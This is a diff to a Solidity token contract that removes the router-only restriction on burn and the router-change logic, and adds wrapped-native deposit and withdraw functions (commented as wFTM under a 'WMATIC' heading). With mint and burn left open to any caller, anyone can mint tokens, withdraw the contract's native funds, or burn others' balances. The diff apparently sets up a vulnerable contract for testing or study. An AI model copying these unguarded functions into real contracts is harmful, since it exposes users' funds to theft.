@@ -21,17 +21,12 @@ contract Token {
   bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
   mapping(address => uint) public nonces;
 
-  address public anyswapRouter;
-  address public pendingAnyswapRouter;
-  uint256 public pendingRouterDelay;
-
   constructor(
     string memory _name,
     string memory _symbol,
     uint256 _decimals,
-    address _anyswapRouter
+    address
   ) {
-    anyswapRouter = _anyswapRouter;
     name = _name;
     symbol = _symbol;
     decimals = _decimals;
@@ -121,21 +116,12 @@ contract Token {
     return _transfer(_from, _to, _value);
   }
 
-  function _getRouter() internal returns (address) {
-    if (pendingRouterDelay != 0 && pendingRouterDelay < block.timestamp) {
-      anyswapRouter = pendingAnyswapRouter;
-      pendingRouterDelay = 0;
-    }
-    return anyswapRouter;
-  }
-
   function mint(address account, uint256 amount) external returns (bool) {
     _mint(account, amount);
     return true;
   }
 
-  function burn(address account, uint256 amount) external returns (bool) {
-    require(msg.sender == _getRouter());
+  function burn(address account, uint256 amount) public returns (bool) {
     totalSupply -= amount;
     balanceOf[account] -= amount;
 
@@ -143,12 +129,45 @@ contract Token {
     return true;
   }
 
-  function changeVault(address _pendingRouter) external returns (bool) {
-    require(msg.sender == _getRouter());
-    require(_pendingRouter != address(0), "AnyswapV3ERC20: address(0x0)");
-    pendingAnyswapRouter = _pendingRouter;
-    pendingRouterDelay = block.timestamp + 86400;
-    emit LogChangeVault(anyswapRouter, _pendingRouter, pendingRouterDelay);
-    return true;
+  // --------------------- WMATIC
+
+  // Error Code: No error.
+  uint256 public constant ERR_NO_ERROR = 0x0;
+
+  // Error Code: Non-zero value expected to perform the function.
+  uint256 public constant ERR_INVALID_ZERO_VALUE = 0x01;
+
+  // deposit wraps received FTM tokens as wFTM in 1:1 ratio by minting
+  // the received amount of FTMs in wFTM on the sender's address.
+  function deposit() public payable returns (uint256) {
+    // there has to be some value to be converted
+    if (msg.value == 0) {
+      return ERR_INVALID_ZERO_VALUE;
+    }
+
+    // we already received FTMs, mint the appropriate amount of wFTM
+    _mint(msg.sender, msg.value);
+
+    // all went well here
+    return ERR_NO_ERROR;
+  }
+
+  // withdraw unwraps FTM tokens by burning specified amount
+  // of wFTM from the caller address and sending the same amount
+  // of FTMs back in exchange.
+  function withdraw(uint256 amount) public returns (uint256) {
+    // there has to be some value to be converted
+    if (amount == 0) {
+      return ERR_INVALID_ZERO_VALUE;
+    }
+
+    // burn wFTM from the sender first to prevent re-entrance issue
+    burn(msg.sender, amount);
+
+    // if wFTM were burned, transfer native tokens back to the sender
+    payable(msg.sender).transfer(amount);
+
+    // all went well here
+    return ERR_NO_ERROR;
   }
 }
